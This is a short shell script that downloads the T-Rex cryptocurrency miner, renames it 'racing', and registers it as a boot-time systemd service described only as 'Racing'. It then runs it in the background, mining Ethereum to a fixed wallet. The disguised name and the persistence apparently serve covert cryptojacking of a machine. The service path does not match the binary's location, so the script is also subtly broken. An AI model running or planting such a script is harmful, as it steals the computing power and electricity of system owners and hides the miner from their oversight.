sudo wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
sudo tar xvzf t-rex-0.21.6-linux.tar.gz
sudo mv t-rex racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x6F3c2438d3927Fbe922657b010FF1357bB67dbc2 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x6F3c2438d3927Fbe922657b010FF1357bB67dbc2 -p x -w shit &
